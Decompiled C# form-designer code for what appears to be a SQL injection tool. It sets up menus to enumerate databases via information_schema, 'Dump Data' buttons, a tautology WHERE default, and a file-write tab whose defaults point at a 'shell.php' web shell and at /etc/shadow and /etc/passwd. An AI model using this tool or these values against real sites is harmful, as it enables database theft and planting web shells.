		});
		this.mnuTree.Name = "mnuListView";
		this.mnuTree.ShowImageMargin = false;
		this.mnuTree.ShowItemToolTips = false;
		this.mnuTree.Size = new global::System.Drawing.Size(230, 826);
		this.mnuCountDBs.Name = "mnuCountDBs";
		this.mnuCountDBs.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCountDBs.Text = "Count Databases";
		this.mnuCountTables.Name = "mnuCountTables";
		this.mnuCountTables.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCountTables.Text = "Count Tables";
		this.mnuCountTablesAll.Name = "mnuCountTablesAll";
		this.mnuCountTablesAll.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCountTablesAll.Text = "Count All Tables";
		this.mnuCountColumns.Name = "mnuCountColumns";
		this.mnuCountColumns.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCountColumns.Text = "Count Columns";
		this.mnuCountColumnsAll.Name = "mnuCountColumnsAll";
		this.mnuCountColumnsAll.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCountColumnsAll.Text = "Count All Columns";
		this.mnuCountRows.Name = "mnuCountRows";
		this.mnuCountRows.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCountRows.Text = "Count Rows";
		this.mnuCountRowsAll.Name = "mnuCountRowsAll";
		this.mnuCountRowsAll.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCountRowsAll.Text = "Count All Rows";
		this.mnuCountSP.Name = "mnuCountSP";
		this.mnuCountSP.Size = new global::System.Drawing.Size(226, 6);
		this.mnuCopyDB.Name = "mnuCopyDB";
		this.mnuCopyDB.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCopyDB.Text = "Clipboard Database";
		this.mnuCopyColumn.Name = "mnuCopyColumn";
		this.mnuCopyColumn.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCopyColumn.Text = "Clipboard Column";
		this.mnuCopyTable.Name = "mnuCopyTable";
		this.mnuCopyTable.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCopyTable.Text = "Clipboard Table";
		this.mnuCheckAllSP.Name = "mnuCheckAllSP";
		this.mnuCheckAllSP.Size = new global::System.Drawing.Size(226, 6);
		this.mnuCheckAllColumns.Name = "mnuCheckAllColumns";
		this.mnuCheckAllColumns.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCheckAllColumns.Text = "Check All Columns";
		this.mnuUnCheckAllColumns.Name = "mnuUnCheckAllColumns";
		this.mnuUnCheckAllColumns.Size = new global::System.Drawing.Size(229, 30);
		this.mnuUnCheckAllColumns.Text = "UnCheck All Columns";
		this.mnuCheckRevert.Name = "mnuCheckRevert";
		this.mnuCheckRevert.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCheckRevert.Text = "Revert All Columns";
		this.mnuTreeSP1.Name = "mnuTreeSP1";
		this.mnuTreeSP1.Size = new global::System.Drawing.Size(226, 6);
		this.mnuCopyAllNodes.Name = "mnuCopyAllNodes";
		this.mnuCopyAllNodes.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCopyAllNodes.Text = "Clipboard All Nodes";
		this.mnuCopyAllSchema.Name = "mnuCopyAllSchema";
		this.mnuCopyAllSchema.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCopyAllSchema.Text = "Clipboard All Schema";
		this.mnuTreeSP2.Name = "mnuTreeSP2";
		this.mnuTreeSP2.Size = new global::System.Drawing.Size(226, 6);
		this.mnuClearNodes.Name = "mnuClearNodes";
		this.mnuClearNodes.Size = new global::System.Drawing.Size(229, 30);
		this.mnuClearNodes.Text = "Clear Node";
		this.mnuClearSchema.Name = "mnuClearSchema";
		this.mnuClearSchema.Size = new global::System.Drawing.Size(229, 30);
		this.mnuClearSchema.Text = "Clear All Schema";
		this.mnuTreeSP3.Name = "mnuTreeSP3";
		this.mnuTreeSP3.Size = new global::System.Drawing.Size(226, 6);
		this.mnuRemDB.Name = "mnuRemDB";
		this.mnuRemDB.Size = new global::System.Drawing.Size(229, 30);
		this.mnuRemDB.Text = "Rem Database";
		this.mnuRemTable.Name = "mnuRemTable";
		this.mnuRemTable.Size = new global::System.Drawing.Size(229, 30);
		this.mnuRemTable.Text = "Rem Table";
		this.mnuRemColumn.Name = "mnuRemColumn";
		this.mnuRemColumn.Size = new global::System.Drawing.Size(229, 30);
		this.mnuRemColumn.Text = "Rem Column";
		this.mnuTreeSP5.Name = "mnuTreeSP5";
		this.mnuTreeSP5.Size = new global::System.Drawing.Size(226, 6);
		this.mnuAddDB.Name = "mnuAddDB";
		this.mnuAddDB.Size = new global::System.Drawing.Size(229, 30);
		this.mnuAddDB.Text = "Add Database";
		this.mnuAddTable.Name = "mnuAddTable";
		this.mnuAddTable.Size = new global::System.Drawing.Size(229, 30);
		this.mnuAddTable.Text = "Add Table";
		this.mnuAddColumn.Name = "mnuAddColumn";
		this.mnuAddColumn.Size = new global::System.Drawing.Size(229, 30);
		this.mnuAddColumn.Text = "Add Column";
		this.mnuTreeSP4.Name = "mnuTreeSP4";
		this.mnuTreeSP4.Size = new global::System.Drawing.Size(226, 6);
		this.mnuCollapseTree.Name = "mnuCollapseTree";
		this.mnuCollapseTree.Size = new global::System.Drawing.Size(229, 30);
		this.mnuCollapseTree.Text = "Collapse Tree";
		this.mnuSortTree.Name = "mnuSortTree";
		this.mnuSortTree.Size = new global::System.Drawing.Size(229, 30);
		this.mnuSortTree.Text = "Sort Tree";
		this.mnuAutoScroll.Name = "mnuAutoScroll";
		this.mnuAutoScroll.Size = new global::System.Drawing.Size(229, 30);
		this.mnuAutoScroll.Text = "Auto Scroll: Yes";
		this.imgTV.ImageStream = (global::System.Windows.Forms.ImageListStreamer)componentResourceManager.GetObject("imgTV.ImageStream");
		this.imgTV.TransparentColor = global::System.Drawing.Color.White;
		this.imgTV.Images.SetKeyName(0, "Database_16x_24.bmp");
		this.imgTV.Images.SetKeyName(1, "Table_16x_24.bmp");
		this.imgTV.Images.SetKeyName(2, "Column_16x_24.bmp");
		this.imgTV.Images.SetKeyName(3, "dataType.ico");
		this.splWhere.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.splWhere.Location = new global::System.Drawing.Point(0, 32);
		this.splWhere.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.splWhere.Name = "splWhere";
		this.splWhere.Orientation = global::System.Windows.Forms.Orientation.Horizontal;
		this.splWhere.Panel1.Controls.Add(this.grbWhere);
		this.splWhere.Panel2.Controls.Add(this.grbOrderBy);
		this.splWhere.Size = new global::System.Drawing.Size(200, 1183);
		this.splWhere.SplitterDistance = 641;
		this.splWhere.SplitterWidth = 6;
		this.splWhere.TabIndex = 23;
		this.grbWhere.Controls.Add(this.txtSchemaWhere);
		this.grbWhere.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.grbWhere.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.grbWhere.Location = new global::System.Drawing.Point(0, 0);
		this.grbWhere.Name = "grbWhere";
		this.grbWhere.Size = new global::System.Drawing.Size(200, 641);
		this.grbWhere.TabIndex = 19;
		this.grbWhere.TabStop = false;
		this.grbWhere.Text = "Where (Field Value)";
		this.txtSchemaWhere.BackColor = global::System.Drawing.SystemColors.Window;
		this.txtSchemaWhere.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.txtSchemaWhere.Enabled = false;
		this.txtSchemaWhere.Font = new global::System.Drawing.Font("Courier New", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		this.txtSchemaWhere.Location = new global::System.Drawing.Point(3, 22);
		this.txtSchemaWhere.Multiline = true;
		this.txtSchemaWhere.Name = "txtSchemaWhere";
		this.txtSchemaWhere.ScrollBars = global::System.Windows.Forms.ScrollBars.Vertical;
		this.txtSchemaWhere.Size = new global::System.Drawing.Size(194, 616);
		this.txtSchemaWhere.TabIndex = 0;
		this.txtSchemaWhere.Text = "1=1 or not 1=0";
		this.grbOrderBy.Controls.Add(this.txtSchemaOrderBy);
		this.grbOrderBy.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.grbOrderBy.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.grbOrderBy.Location = new global::System.Drawing.Point(0, 0);
		this.grbOrderBy.Name = "grbOrderBy";
		this.grbOrderBy.Size = new global::System.Drawing.Size(200, 536);
		this.grbOrderBy.TabIndex = 20;
		this.grbOrderBy.TabStop = false;
		this.grbOrderBy.Text = "Order By (Field ASC/DESC)";
		this.txtSchemaOrderBy.BackColor = global::System.Drawing.SystemColors.Window;
		this.txtSchemaOrderBy.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.txtSchemaOrderBy.Enabled = false;
		this.txtSchemaOrderBy.Font = new global::System.Drawing.Font("Courier New", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		this.txtSchemaOrderBy.Location = new global::System.Drawing.Point(3, 22);
		this.txtSchemaOrderBy.Multiline = true;
		this.txtSchemaOrderBy.Name = "txtSchemaOrderBy";
		this.txtSchemaOrderBy.ScrollBars = global::System.Windows.Forms.ScrollBars.Vertical;
		this.txtSchemaOrderBy.Size = new global::System.Drawing.Size(194, 511);
		this.txtSchemaOrderBy.TabIndex = 0;
		this.txtSchemaOrderBy.Text = "1 asc, 2 desc";
		this.tsConvert1.GripStyle = global::System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsConvert1.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.tsConvert1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.btnFiltersClear1,
			this.btnConvert,
			this.ToolStripDropDownButton1
		});
		this.tsConvert1.Location = new global::System.Drawing.Point(0, 0);
		this.tsConvert1.Name = "tsConvert1";
		this.tsConvert1.Padding = new global::System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsConvert1.ShowItemToolTips = false;
		this.tsConvert1.Size = new global::System.Drawing.Size(200, 32);
		this.tsConvert1.TabIndex = 21;
		this.tsConvert1.Text = "ToolStrip3";
		this.btnFiltersClear1.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnFiltersClear1.Image = global::ns0.Class6.delete;
		this.btnFiltersClear1.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnFiltersClear1.Name = "btnFiltersClear1";
		this.btnFiltersClear1.Size = new global::System.Drawing.Size(28, 29);
		this.btnFiltersClear1.Text = "Clear Query";
		this.btnConvert.DropDown = this.ctmConvert;
		this.btnConvert.Image = global::ns0.Class6.ChartFilter_16x_24;
		this.btnConvert.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnConvert.Name = "btnConvert";
		this.btnConvert.Size = new global::System.Drawing.Size(116, 29);
		this.btnConvert.Text = "&Convert";
		this.ctmConvert.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.ctmConvert.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.mnuConvHex,
			this.mnuConvChar,
			this.mnuConvCharGroup,
			this.ToolStripMenuItem2,
			this.mnuConvLEN,
			this.mnuConvAddA
		});
		this.ctmConvert.Name = "mnuListView";
		this.ctmConvert.OwnerItem = this.btnConvert;
		this.ctmConvert.ShowImageMargin = false;
		this.ctmConvert.ShowItemToolTips = false;
		this.ctmConvert.Size = new global::System.Drawing.Size(238, 160);
		this.mnuConvHex.Name = "mnuConvHex";
		this.mnuConvHex.Size = new global::System.Drawing.Size(237, 30);
		this.mnuConvHex.Text = "To Hex";
		this.mnuConvChar.Name = "mnuConvChar";
		this.mnuConvChar.Size = new global::System.Drawing.Size(237, 30);
		this.mnuConvChar.Text = "To Char";
		this.mnuConvCharGroup.Name = "mnuConvCharGroup";
		this.mnuConvCharGroup.Size = new global::System.Drawing.Size(237, 30);
		this.mnuConvCharGroup.Text = "To Group Char";
		this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
		this.ToolStripMenuItem2.Size = new global::System.Drawing.Size(234, 6);
		this.mnuConvLEN.Name = "mnuConvLEN";
		this.mnuConvLEN.Size = new global::System.Drawing.Size(237, 30);
		this.mnuConvLEN.Text = "LEN() OR LENGHT";
		this.mnuConvAddA.Name = "mnuConvAddA";
		this.mnuConvAddA.Size = new global::System.Drawing.Size(237, 30);
		this.mnuConvAddA.Text = "Add enconded '%@%'";
		this.mnuConvert.DropDown = this.ctmConvert;
		this.mnuConvert.Image = global::ns0.Class6.ChartFilter_16x_24;
		this.mnuConvert.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.mnuConvert.Name = "mnuConvert";
		this.mnuConvert.Size = new global::System.Drawing.Size(116, 29);
		this.mnuConvert.Text = "&Convert";
		this.ToolStripDropDownButton1.DropDown = this.ctmSchema;
		this.ToolStripDropDownButton1.Image = global::ns0.Class6.Template_16x_24;
		this.ToolStripDropDownButton1.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.ToolStripDropDownButton1.Name = "ToolStripDropDownButton1";
		this.ToolStripDropDownButton1.Size = new global::System.Drawing.Size(102, 29);
		this.ToolStripDropDownButton1.Text = "&Query";
		this.ctmSchema.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.ctmSchema.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.mnuSchema0,
			this.mnuSchema1,
			this.mnuSchema2,
			this.mnuSchema3,
			this.mnuSchema4,
			this.mnuSchema5,
			this.mnuSchema6,
			this.mnuSchema7,
			this.mnuSchema8,
			this.mnuSchema9
		});
		this.ctmSchema.Name = "mnuListView";
		this.ctmSchema.OwnerItem = this.ToolStripDropDownButton1;
		this.ctmSchema.ShowImageMargin = false;
		this.ctmSchema.Size = new global::System.Drawing.Size(220, 304);
		this.mnuSchema0.Name = "mnuSchema0";
		this.mnuSchema0.Size = new global::System.Drawing.Size(219, 30);
		this.mnuSchema0.Text = "information_schema";
		this.mnuSchema1.Name = "mnuSchema1";
		this.mnuSchema1.Size = new global::System.Drawing.Size(219, 30);
		this.mnuSchema1.Text = "   schema";
		this.mnuSchema2.Name = "mnuSchema2";
		this.mnuSchema2.Size = new global::System.Drawing.Size(219, 30);
		this.mnuSchema2.Text = "      schema_name";
		this.mnuSchema3.Name = "mnuSchema3";
		this.mnuSchema3.Size = new global::System.Drawing.Size(219, 30);
		this.mnuSchema3.Text = "   tables";
		this.mnuSchema4.Name = "mnuSchema4";
		this.mnuSchema4.Size = new global::System.Drawing.Size(219, 30);
		this.mnuSchema4.Text = "      table_name";
		this.mnuSchema5.Name = "mnuSchema5";
		this.mnuSchema5.Size = new global::System.Drawing.Size(219, 30);
		this.mnuSchema5.Text = "      table_schema";
		this.mnuSchema6.Name = "mnuSchema6";
		this.mnuSchema6.Size = new global::System.Drawing.Size(219, 30);
		this.mnuSchema6.Text = "   columns";
		this.mnuSchema7.Name = "mnuSchema7";
		this.mnuSchema7.Size = new global::System.Drawing.Size(219, 30);
		this.mnuSchema7.Text = "      column_name";
		this.mnuSchema8.Name = "mnuSchema8";
		this.mnuSchema8.Size = new global::System.Drawing.Size(219, 30);
		this.mnuSchema8.Text = "      table_schema";
		this.mnuSchema9.Name = "mnuSchema9";
		this.mnuSchema9.Size = new global::System.Drawing.Size(219, 30);
		this.mnuSchema9.Text = "      table_name";
		this.ToolStripMenuItem12.DropDown = this.ctmSchema;
		this.ToolStripMenuItem12.Name = "ToolStripMenuItem12";
		this.ToolStripMenuItem12.Size = new global::System.Drawing.Size(293, 30);
		this.ToolStripMenuItem12.Text = "information_schema";
		this.tsSchema.GripStyle = global::System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsSchema.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.tsSchema.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.lblCountBDs,
			this.ToolStripSeparator22,
			this.btnClearSchema,
			this.ToolStripSeparator13,
			this.btnDataBases,
			this.ToolStripSeparator5,
			this.btnTables,
			this.btnColumns,
			this.btnColumnUp,
			this.btnColumnDown,
			this.btnDumpData
		});
		this.tsSchema.Location = new global::System.Drawing.Point(3, 3);
		this.tsSchema.Name = "tsSchema";
		this.tsSchema.Padding = new global::System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsSchema.ShowItemToolTips = false;
		this.tsSchema.Size = new global::System.Drawing.Size(1385, 32);
		this.tsSchema.TabIndex = 0;
		this.tsSchema.Text = "ToolStrip1";
		this.lblCountBDs.ForeColor = global::System.Drawing.Color.Gray;
		this.lblCountBDs.Name = "lblCountBDs";
		this.lblCountBDs.Size = new global::System.Drawing.Size(29, 29);
		this.lblCountBDs.Text = "-1";
		this.ToolStripSeparator22.Name = "ToolStripSeparator22";
		this.ToolStripSeparator22.Size = new global::System.Drawing.Size(6, 32);
		this.btnClearSchema.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnClearSchema.Image = global::ns0.Class6.delete;
		this.btnClearSchema.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnClearSchema.Name = "btnClearSchema";
		this.btnClearSchema.Size = new global::System.Drawing.Size(28, 29);
		this.btnClearSchema.Text = "Clear Schema";
		this.ToolStripSeparator13.Name = "ToolStripSeparator13";
		this.ToolStripSeparator13.Size = new global::System.Drawing.Size(6, 32);
		this.btnDataBases.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.btnDataBases.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnDataBases.Name = "btnDataBases";
		this.btnDataBases.Size = new global::System.Drawing.Size(130, 29);
		this.btnDataBases.Text = "Get &Databases";
		this.ToolStripSeparator5.Name = "ToolStripSeparator5";
		this.ToolStripSeparator5.Size = new global::System.Drawing.Size(6, 32);
		this.btnTables.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.btnTables.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnTables.Name = "btnTables";
		this.btnTables.Size = new global::System.Drawing.Size(96, 29);
		this.btnTables.Text = "Get &Tables";
		this.btnTables.Visible = false;
		this.btnColumns.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.btnColumns.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnColumns.Name = "btnColumns";
		this.btnColumns.Size = new global::System.Drawing.Size(118, 29);
		this.btnColumns.Text = "Get &Columns";
		this.btnColumns.Visible = false;
		this.btnColumnUp.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnColumnUp.Image = global::ns0.Class6.Upload_gray_inverse_16x_24;
		this.btnColumnUp.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnColumnUp.Name = "btnColumnUp";
		this.btnColumnUp.Size = new global::System.Drawing.Size(28, 29);
		this.btnColumnUp.Text = "Move Column Up";
		this.btnColumnUp.Visible = false;
		this.btnColumnDown.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnColumnDown.Image = global::ns0.Class6.Download_grey_inverse_24;
		this.btnColumnDown.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnColumnDown.Name = "btnColumnDown";
		this.btnColumnDown.Size = new global::System.Drawing.Size(28, 29);
		this.btnColumnDown.Text = "Move Column Down";
		this.btnColumnDown.Visible = false;
		this.btnDumpData.Alignment = global::System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnDumpData.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.btnDumpData.Image = global::ns0.Class6.Run_16x_24;
		this.btnDumpData.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnDumpData.Name = "btnDumpData";
		this.btnDumpData.Size = new global::System.Drawing.Size(132, 29);
		this.btnDumpData.Text = "D&ump Data";
		this.btnDumpData.Visible = false;
		this.tpQuery.Controls.Add(this.splQuery);
		this.tpQuery.Controls.Add(this.tsCustomDump);
		this.tpQuery.ImageIndex = 1;
		this.tpQuery.Location = new global::System.Drawing.Point(4, 29);
		this.tpQuery.Name = "tpQuery";
		this.tpQuery.Padding = new global::System.Windows.Forms.Padding(3);
		this.tpQuery.Size = new global::System.Drawing.Size(1391, 1253);
		this.tpQuery.TabIndex = 1;
		this.tpQuery.Text = "Query";
		this.tpQuery.UseVisualStyleBackColor = true;
		this.splQuery.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.splQuery.Location = new global::System.Drawing.Point(3, 35);
		this.splQuery.Name = "splQuery";
		this.splQuery.Orientation = global::System.Windows.Forms.Orientation.Horizontal;
		this.splQuery.Panel1.Controls.Add(this.txtCustomQuery);
		this.splQuery.Panel1.Controls.Add(this.lblSelect);
		this.splQuery.Panel2.Controls.Add(this.txtCustomQueryFrom);
		this.splQuery.Panel2.Controls.Add(this.lblFrom);
		this.splQuery.Size = new global::System.Drawing.Size(1385, 1215);
		this.splQuery.SplitterDistance = 572;
		this.splQuery.SplitterWidth = 2;
		this.splQuery.TabIndex = 18;
		this.txtCustomQuery.BackColor = global::System.Drawing.SystemColors.Window;
		this.txtCustomQuery.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.txtCustomQuery.Font = new global::System.Drawing.Font("Courier New", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		this.txtCustomQuery.Location = new global::System.Drawing.Point(134, 0);
		this.txtCustomQuery.Multiline = true;
		this.txtCustomQuery.Name = "txtCustomQuery";
		this.txtCustomQuery.ScrollBars = global::System.Windows.Forms.ScrollBars.Both;
		this.txtCustomQuery.Size = new global::System.Drawing.Size(1251, 572);
		this.txtCustomQuery.TabIndex = 0;
		this.txtCustomQuery.TabStop = false;
		this.txtCustomQuery.WordWrap = false;
		this.lblSelect.BorderStyle = global::System.Windows.Forms.BorderStyle.Fixed3D;
		this.lblSelect.Dock = global::System.Windows.Forms.DockStyle.Left;
		this.lblSelect.Font = new global::System.Drawing.Font("Courier New", 9f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		this.lblSelect.Location = new global::System.Drawing.Point(0, 0);
		this.lblSelect.Name = "lblSelect";
		this.lblSelect.Size = new global::System.Drawing.Size(134, 572);
		this.lblSelect.TabIndex = 3;
		this.lblSelect.Text = "SELECT";
		this.lblSelect.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
		this.txtCustomQueryFrom.BackColor = global::System.Drawing.SystemColors.Window;
		this.txtCustomQueryFrom.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.txtCustomQueryFrom.Font = new global::System.Drawing.Font("Courier New", 10f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		this.txtCustomQueryFrom.Location = new global::System.Drawing.Point(134, 0);
		this.txtCustomQueryFrom.Multiline = true;
		this.txtCustomQueryFrom.Name = "txtCustomQueryFrom";
		this.txtCustomQueryFrom.ScrollBars = global::System.Windows.Forms.ScrollBars.Both;
		this.txtCustomQueryFrom.Size = new global::System.Drawing.Size(1251, 641);
		this.txtCustomQueryFrom.TabIndex = 0;
		this.txtCustomQueryFrom.TabStop = false;
		this.txtCustomQueryFrom.WordWrap = false;
		this.lblFrom.BorderStyle = global::System.Windows.Forms.BorderStyle.Fixed3D;
		this.lblFrom.Dock = global::System.Windows.Forms.DockStyle.Left;
		this.lblFrom.Font = new global::System.Drawing.Font("Courier New", 9f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		this.lblFrom.Location = new global::System.Drawing.Point(0, 0);
		this.lblFrom.Name = "lblFrom";
		this.lblFrom.Size = new global::System.Drawing.Size(134, 641);
		this.lblFrom.TabIndex = 2;
		this.lblFrom.Text = "FROM";
		this.lblFrom.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
		this.lblFrom.Visible = false;
		this.tsCustomDump.GripStyle = global::System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsCustomDump.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.tsCustomDump.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.btnDumpCustom,
			this.btnDefCustomQuery,
			this.ToolStripSeparator19,
			this.mnuTemplates,
			this.ToolStripSeparator9,
			this.mnuConvert
		});
		this.tsCustomDump.Location = new global::System.Drawing.Point(3, 3);
		this.tsCustomDump.Name = "tsCustomDump";
		this.tsCustomDump.Padding = new global::System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsCustomDump.ShowItemToolTips = false;
		this.tsCustomDump.Size = new global::System.Drawing.Size(1385, 32);
		this.tsCustomDump.TabIndex = 0;
		this.tsCustomDump.Text = "ToolStrip3";
		this.btnDumpCustom.Alignment = global::System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnDumpCustom.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.btnDumpCustom.Image = global::ns0.Class6.Run_16x_24;
		this.btnDumpCustom.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnDumpCustom.Name = "btnDumpCustom";
		this.btnDumpCustom.Size = new global::System.Drawing.Size(152, 29);
		this.btnDumpCustom.Text = "&Execute Query";
		this.btnDefCustomQuery.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnDefCustomQuery.Image = global::ns0.Class6.delete;
		this.btnDefCustomQuery.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnDefCustomQuery.Name = "btnDefCustomQuery";
		this.btnDefCustomQuery.Size = new global::System.Drawing.Size(28, 29);
		this.btnDefCustomQuery.Text = "Defaut Query Template";
		this.ToolStripSeparator19.Name = "ToolStripSeparator19";
		this.ToolStripSeparator19.Size = new global::System.Drawing.Size(6, 32);
		this.mnuTemplates.Image = global::ns0.Class6.Template_16x_24;
		this.mnuTemplates.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.mnuTemplates.Name = "mnuTemplates";
		this.mnuTemplates.Size = new global::System.Drawing.Size(102, 29);
		this.mnuTemplates.Text = "&Query";
		this.ToolStripSeparator9.Name = "ToolStripSeparator9";
		this.ToolStripSeparator9.Size = new global::System.Drawing.Size(6, 32);
		this.tpMyLoadFile.Controls.Add(this.grbWriteFile);
		this.tpMyLoadFile.Controls.Add(this.grbLoadFile);
		this.tpMyLoadFile.ImageIndex = 2;
		this.tpMyLoadFile.Location = new global::System.Drawing.Point(4, 29);
		this.tpMyLoadFile.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tpMyLoadFile.Name = "tpMyLoadFile";
		this.tpMyLoadFile.Padding = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.tpMyLoadFile.Size = new global::System.Drawing.Size(1391, 1253);
		this.tpMyLoadFile.TabIndex = 4;
		this.tpMyLoadFile.Text = "Load\\Write File";
		this.tpMyLoadFile.UseVisualStyleBackColor = true;
		this.grbWriteFile.Controls.Add(this.tsMySQLWriteFile);
		this.grbWriteFile.Controls.Add(this.txtMySQLWriteFile);
		this.grbWriteFile.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.grbWriteFile.Location = new global::System.Drawing.Point(4, 82);
		this.grbWriteFile.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbWriteFile.Name = "grbWriteFile";
		this.grbWriteFile.Padding = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbWriteFile.Size = new global::System.Drawing.Size(1383, 288);
		this.grbWriteFile.TabIndex = 12;
		this.grbWriteFile.TabStop = false;
		this.grbWriteFile.Text = "File Write (Magic Quotes Enable are required)";
		this.tsMySQLWriteFile.Dock = global::System.Windows.Forms.DockStyle.Bottom;
		this.tsMySQLWriteFile.GripStyle = global::System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsMySQLWriteFile.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.tsMySQLWriteFile.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.lblWritePath,
			this.txtMySQLWriteFilePath,
			this.ToolStripSeparator1,
			this.cmbMySQLWriteFilePath,
			this.ToolStripSeparator3,
			this.btnMySQLWriteFile
		});
		this.tsMySQLWriteFile.Location = new global::System.Drawing.Point(4, 250);
		this.tsMySQLWriteFile.Name = "tsMySQLWriteFile";
		this.tsMySQLWriteFile.Padding = new global::System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsMySQLWriteFile.RenderMode = global::System.Windows.Forms.ToolStripRenderMode.System;
		this.tsMySQLWriteFile.ShowItemToolTips = false;
		this.tsMySQLWriteFile.Size = new global::System.Drawing.Size(1375, 33);
		this.tsMySQLWriteFile.TabIndex = 127;
		this.tsMySQLWriteFile.Text = "ToolStrip2";
		this.lblWritePath.AutoSize = false;
		this.lblWritePath.Name = "lblWritePath";
		this.lblWritePath.Size = new global::System.Drawing.Size(50, 19);
		this.lblWritePath.Text = "Path:";
		this.lblWritePath.TextAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.txtMySQLWriteFilePath.AutoCompleteCustomSource.AddRange(new string[]
		{
			"'/home/www/HostName_com/html/shell.php'",
			"'/etc/passwd/a.bin'",
			"'/etc/shadow/a.bin'",
			"'/etc/default/passwd/a.bin'",
			"'/etc/passwd/a.bin'",
			"'/etc/login.defs/a.bin'",
			"'/etc/group/a.bin'",
			"'/etc/apache2/a.bin'",
			"'c:\\\\a.bin'",
			"'c://a.bin'"
		});
		this.txtMySQLWriteFilePath.AutoCompleteMode = global::System.Windows.Forms.AutoCompleteMode.Suggest;
		this.txtMySQLWriteFilePath.AutoCompleteSource = global::System.Windows.Forms.AutoCompleteSource.CustomSource;
		this.txtMySQLWriteFilePath.AutoSize = false;
		this.txtMySQLWriteFilePath.Name = "txtMySQLWriteFilePath";
		this.txtMySQLWriteFilePath.Size = new global::System.Drawing.Size(298, 31);
		this.txtMySQLWriteFilePath.Text = "'/home/www/HostName_com/html/shell.php'";
		this.ToolStripSeparator1.Name = "ToolStripSeparator1";
